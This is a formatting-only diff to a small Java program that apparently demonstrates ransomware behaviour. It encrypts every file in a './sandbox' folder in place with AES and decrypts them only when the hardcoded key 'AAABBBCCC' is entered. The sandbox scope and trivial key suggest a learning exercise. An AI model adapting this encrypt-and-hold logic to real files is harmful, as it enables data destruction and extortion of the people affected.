@@ -21,21 +21,20 @@ public class Main {
       System.out.println("[+] Secret Key (Base64): " + encodedKey);
 
       //String plaintext = "Here goes a secret Message";
-      Set<String> filesToEncrypt = listFiles();
+      Set < String > filesToEncrypt = listFiles();
       String fileContent = "";
       System.out.println(filesToEncrypt);
-      for (String file : filesToEncrypt) {
+      for (String file: filesToEncrypt) {
         try {
-            Path path = Paths.get("./sandbox/" + file);
-            fileContent = Files.readString(path);
-            String encryptedFile = AESCore.encrypt(fileContent, secretKey);
-            Files.writeString(path, encryptedFile);
+          Path path = Paths.get("./sandbox/" + file);
+          fileContent = Files.readString(path);
+          String encryptedFile = AESCore.encrypt(fileContent, secretKey);
+          Files.writeString(path, encryptedFile);
         } catch (IOException e) {
-            System.err.println("Error reading file: " + e.getMessage());
+          System.err.println("Error reading file: " + e.getMessage());
         }
       }
       System.out.println("[*] FILE CONTENT: " + fileContent);
-
 
       //String ciphertext = AESCore.encrypt(fileContent, secretKey);
       //System.out.println("[+] Encrypted: " + ciphertext);
@@ -51,8 +50,8 @@ public class Main {
         System.out.println("Whoops");
       }*/
 
-      if(UserEncodedKey != null && UserEncodedKey.equals("AAABBBCCC")) {
-        for (String file : filesToEncrypt) {
+      if (UserEncodedKey != null && UserEncodedKey.equals("AAABBBCCC")) {
+        for (String file: filesToEncrypt) {
           try {
             Path path = Paths.get("./sandbox/" + file);
             fileContent = Files.readString(path);
@@ -70,7 +69,7 @@ public class Main {
       e.printStackTrace();
     }
   }
-  public static Set<String> listFiles() {
+  public static Set < String > listFiles() {
     return Stream.of(new File("./sandbox").listFiles())
       .filter(file -> !file.isDirectory())
       .map(File::getName)
